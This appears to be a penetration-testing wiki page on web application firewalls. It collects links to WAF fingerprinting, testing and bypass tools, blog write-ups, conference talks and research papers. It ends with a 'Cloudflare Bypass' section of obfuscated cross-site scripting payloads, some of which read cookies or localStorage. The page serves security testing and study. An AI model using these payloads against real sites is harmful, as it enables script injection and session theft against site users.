# Web Application Firewall

## WAF Testing Resources

[Awesome-WAF](https://github.com/0xInfection/Awesome-WAF) - The Definitive Guide.

<details>

<summary>Detection and Fingerprinting Tools</summary>

* [WhatWaf](https://github.com/Ekultek/WhatWaf) - Detect and bypass web application firewalls and protection systems
* [WAFW00F](https://github.com/enablesecurity/wafw00f) - The ultimate WAF fingerprinting tool with the largest fingerprint database from [@EnableSecurity](https://github.com/enablesecurity).
* [IdentYwaf](https://github.com/stamparm/identywaf) - A blind WAF detection tool which utlises a unique method of identifying WAFs based upon previously collected fingerprints by [@stamparm](https://github.com/stamparm).

</details>

<details>

<summary>WAF Testing Guides and Tools</summary>

* [XSS-Rat's WAF Checklist](https://github.com/The-XSS-Rat/SecurityTesting/blob/master/Checklists/WAF-bypass-checklist.md) - Everything you need to do to bypass a Web Application Firewall.
* [GoTestWAF](https://github.com/wallarm/gotestwaf) - A tool to test a WAF's detection logic and bypasses from [@wallarm](https://github.com/wallarm).
* [Lightbulb Framework](https://github.com/lightbulb-framework/lightbulb-framework) - A WAF testing suite written in Python.
* [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
* [WAF Testing Framework](https://www.imperva.com/lg/lgw\_trial.asp?pid=483) - A WAF testing tool by [Imperva](https://imperva.com).
* [Framework for Testing WAFs (FTW)](https://github.com/coreruleset/ftw) - A framework by the [OWASP CRS team](https://coreruleset.org/) that helps to provide rigorous tests for WAF rules by using the OWASP Core Ruleset V3 as a baseline.
* [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) - Bypassing WAF by abusing SSL/TLS Ciphers

</details>

<details>

<summary>WAF Evasion and Bypass Tools</summary>

* [WAFNinja](https://github.com/khalilbijjou/wafninja) - A smart tool which fuzzes and can suggest bypasses for a given WAF by [@khalilbijjou](https://github.com/khalilbijjou/).
* [WAFTester](https://github.com/Raz0r/waftester) - Another tool which can obfuscate payloads to bypass WAFs by [@Raz0r](https://github.com/Raz0r/).
* [libinjection-fuzzer](https://github.com/migolovanov/libinjection-fuzzer) - A fuzzer intended for finding `libinjection` bypasses but can be probably used universally.
* [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) - Firewall bypass script based on DNS history records. This script will search for DNS A history records and check if the server replies for that domain. Handy for bugbounty hunters.
* [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf) - A tool which finds out supported SSL/TLS ciphers and helps in evading WAFs.
* [SQLMap Tamper Scripts](https://github.com/sqlmapproject/sqlmap) - Tamper scripts in SQLMap obfuscate payloads which might evade some WAFs.
* [Bypass WAF BurpSuite Plugin](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c) - A plugin for Burp Suite which adds some request headers so that the requests seem from the internal network
* Bypass Payloads
  * [https://github.com/waf-bypass-maker/waf-community-bypasses](https://github.com/waf-bypass-maker/waf-community-bypasses)
  * [https://github.com/Walidhossain010/WAF-bypass-xss-payloads](https://github.com/Walidhossain010/WAF-bypass-xss-payloads)

</details>

## Training and Research

{% tabs %}
{% tab title="Blogs and Writeups" %}
> Many of the content mentioned above have been taken from some of the following excellent writeup

* [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com).
* [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com).
* [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com).
* [How To Exploit PHP Remotely To Bypass Filters & WAF Rules](https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/)- By [@Secjuice](https://secjuice.com)
* [ModSecurity SQL Injection Challenge: Lessons Learned](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-sql-injection-challenge-lessons-learned/) - By [@SpiderLabs](https://trustwave.com).
* [XXE that can Bypass WAF](https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0) - By [@WallArm](https://labs.wallarm.com).
* [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL\_Injection\_Bypassing\_WAF) - By [@OWASP](https://owasp.com).
* [How To Reverse Engineer A Web Application Firewall Using Regular Expression Reversing](https://www.sunnyhoi.com/reverse-engineer-web-application-firewall-using-regular-expression-reversing/) - By [@SunnyHoi](https://twitter.com/sunnyhoi).
* [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html) - By [@0x09AL](https://twitter.com/0x09al).
* [Request Encoding to Bypass WAFs](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/) - By [@Soroush Dalili](https://twitter.com/irsdl)
{% endtab %}

{% tab title="Presentations" %}
* [Methods to Bypass a Web Application Firewall](https://github.com/0xInfection/Awesome-WAF/blob/master/presentrations/Methods%20To%20Bypass%20A%20Web%20Application%20Firewall.pdf) - A presentation from [PT Security](https://www.ptsecurity.com) about bypassing WAF filters and evasion.
* [Web Application Firewall Bypassing (How to Defeat the Blue Team)](https://github.com/0xInfection/Awesome-WAF/blob/master/presentation/Web%20Application%20Firewall%20Bypassing%20\(How%20to%20Defeat%20the%20Blue%20Team\).pdf) - A presentation about bypassing WAF filtering and ruleset fuzzing for evasion by [@OWASP](https://owasp.org).
* [WAF Profiling & Evasion Techniques](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/OWASP%20WAF%20Profiling%20&%20Evasion.pdf) - A WAF testing and evasion guide from [OWASP](https://www.owasp.org).
* [Protocol Level WAF Evasion Techniques](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/BlackHat%20US%2012%20-%20Protocol%20Level%20WAF%20Evasion%20\(Slides\).pdf) - A presentation at about efficiently evading WAFs at protocol level from [BlackHat US 12](https://www.blackhat.com/html/bh-us-12/).
* [Analysing Attacking Detection Logic Mechanisms](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/BlackHat%20US%2016%20-%20Analysis%20of%20Attack%20Detection%20Logic.pdf) - A presentation about WAF logic applied to detecting attacks from [BlackHat US 16](https://www.blackhat.com/html/bh-us-16/).
* [WAF Bypasses and PHP Exploits](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/WAF%20Bypasses%20and%20PHP%20Exploits%20\(Slides\).pdf) - A presentation about evading WAFs and developing related PHP exploits.
* [Side Channel Attacks for Fingerprinting WAF Filter Rules](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Side%20Channel%20Attacks%20for%20Fingerprinting%20WAF%20Filter%20Rules.pdf) - A presentation about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
* [Our Favorite XSS Filters/IDS and how to Attack Them](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/).
* [Playing Around with WAFs](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
* [A Forgotten HTTP Invisibility Cloak](https://github.com/0xInfection/Awesome-WAF/blob/master/presentation/A%20Forgotten%20HTTP%20Invisibility%20Cloak.pdf) - A presentation about techniques that can be used to bypass common WAFs from [BSides Manchester](https://www.bsidesmcr.org.uk/).
* [Building Your Own WAF as a Service and Forgetting about False Positives](https://github.com/0xInfection/Awesome-WAF/blob/master/presentations/Building%20Your%20Own%20WAF%20as%20a%20Service%20and%20Forgetting%20about%20False%20Positives.pdf) - A presentation about how to build a hybrid mode waf that can work both in an out-of-band manner as well as inline to reduce false positives and latency [Auscert2019](https://conference.auscert.org.au/).
{% endtab %}

{% tab title="Videos" %}
* [WAF Bypass Techniques Using HTTP Standard and Web Servers Behavior](https://www.youtube.com/watch?v=tSf\_IXfuzXk) from [@OWASP](https://owasp.org).
* [Confessions of a WAF Developer: Protocol-Level Evasion of Web App Firewalls](https://www.youtube.com/watch?v=PVVG4rCFZGU) from [BlackHat USA 12](https://blackhat.com/html/bh-us-12).
* [Web Application Firewall - Analysis of Detection Logic](https://www.youtube.com/watch?v=dMFJLicdaC0) from [BlackHat](https://blackhat.com).
* [Bypassing Browser Security Policies for Fun & Profit](https://www.youtube.com/watch?v=P5R4KeCzO-Q) from [BlackHat](https://blackhat.com).
* [Web Application Firewall Bypassing](https://www.youtube.com/watch?v=SD7ForrwUMY) from [Positive Technologies](https://ptsecurity.com).
* [Fingerprinting Filter Rules of Web Application Firewalls - Side Channeling Attacks](https://www.usenix.org/conference/woot12/workshop-program/presentation/schmitt) from [@UseNix](https://www.usenix.com).
* [Evading Deep Inspection Systems for Fun and Shell](https://www.youtube.com/watch?v=BkmPZhgLmRo) from [BlackHat US 13](https://blackhat.com/html/bh-us-13).
* [Bypass OWASP CRS && CWAF (WAF Rule Testing - Unrestricted File Upload)](https://www.youtube.com/watch?v=lWoxAjvgiHs) from [Fools of Security](https://www.youtube.com/channel/UCEBHO0kD1WFvIhf9wBCU-VQ).
* [WAFs FTW! A modern devops approach to security testing your WAF](https://www.youtube.com/watch?v=05Uy0R7UdFw) from [AppSec USA 17](https://www.youtube.com/user/OWASPGLOBAL).
* [Web Application Firewall Bypassing WorkShop](https://www.youtube.com/watch?v=zfBT7Kc57xs) from [OWASP](https://owasp.com).
* [Bypassing Modern WAF's Exemplified At XSS by Rafay Baloch](https://www.youtube.com/watch?v=dWLpw-7\_pa8) from [Rafay Bloch](http://rafaybaloch.com).
* [WTF - WAF Testing Framework](https://www.youtube.com/watch?v=ixb-L5JWJgI) from [AppSecUSA 13](https://owasp.org).
* [The Death of a Web App Firewall](https://www.youtube.com/watch?v=mB\_xGSNm8Z0) from [Brian McHenry](https://www.youtube.com/channel/UCxzs-N2sHnXFwi0XjDIMTPg).
* [Adventures with the WAF](https://www.youtube.com/watch?v=rdwB\_p0KZXM) from [BSides Manchester](https://www.youtube.com/channel/UC1mLiimOTqZFK98VwM8Ke4w).
* [Bypassing Intrusion Detection Systems](https://www.youtube.com/watch?v=cJ3LhQXzrXw) from [BlackHat](https://blackhat.com).
* [Building Your Own WAF as a Service and Forgetting about False Positives](https://www.youtube.com/watch?v=dgqUcHprolc) from [Auscert](https://conference.auscert.org.au).
{% endtab %}

{% tab title="Research Papers" %}
#### Research Papers:

* [Protocol Level WAF Evasion](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
* [Neural Network based WAF for SQLi](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection.pdf) - A paper about building a neural network based WAF for detecting SQLi attacks.
* [Bypassing Web Application Firewalls with HTTP Parameter Pollution](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A research paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
* [Poking A Hole in the Firewall](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Poking%20A%20Hole%20In%20The%20Firewall.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about modern firewall analysis.
* [Modern WAF Fingerprinting and XSS Filter Bypass](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Modern%20WAF%20Fingerprinting%20and%20XSS%20Filter%20Bypass.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about WAF fingerprinting and bypassing XSS filters.
* [WAF Evasion Testing](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
* [Side Channel Attacks for Fingerprinting WAF Filter Rules](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Side%20Channel%20\(Timing\)%20Attacks%20for%20Fingerprinting%20WAF%20Rules.pdf) - A paper about how side channel attacks can be utilised to fingerprint firewall filter rules from [UseNix Woot'12](https://www.usenix.org/conference/woot12).
* [WASC WAF Evaluation Criteria](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/WASC%20WAF%20Evaluation%20Criteria.pdf) - A guide for WAF Evaluation from [Web Application Security Consortium](http://www.webappsec.org).
* [WAF Evaluation and Analysis](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Web%20Application%20Firewalls%20-%20Evaluation%20and%20Analysis.pdf) - A paper about WAF evaluation and analysis of 2 most used WAFs (ModSecurity & WebKnight) from [University of Amsterdam](http://www.uva.nl).
* [Bypassing all WAF XSS Filters](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Evading%20All%20Web-Application%20Firewalls%20XSS%20Filters.pdf) - A paper about bypassing all XSS filter rules and evading WAFs for XSS.
* [Beyond SQLi - Obfuscate and Bypass WAFs](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Beyond%20SQLi%20-%20Obfuscate%20and%20Bypass%20WAFs.txt) - A research paper from [Exploit Database](https://exploit-db.com) about obfuscating SQL injection queries to effectively bypass WAFs.
* [Bypassing WAF XSS Detection Mechanisms](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf) - A research paper about bypassing XSS detection mechanisms in WAFs.
{% endtab %}
{% endtabs %}

## Cloudflare Bypass

<details>

<summary>Cloudflare Bypass</summary>

```
<svg%0Aonauxclick=0;[1].some(confirm)//

<svg onload=alert%26%230000000040"")>

<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
<svg onx=() onload=(confirm)(1)>

<svg onx=() onload=(confirm)(document.cookie)>

<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

"><onx=[] onmouseover=prompt(1)>

%2sscript%2ualert()%2s/script%2u -xss popup

<svg onload=alert%26%230000000040"1")>

"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))

[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<svg/onrandom=random onload=confirm(1)>

<video onnull=null onmouseover=confirm(1)>

<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>

:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

<img ignored=() src=x onerror=prompt(1)>
```



</details>
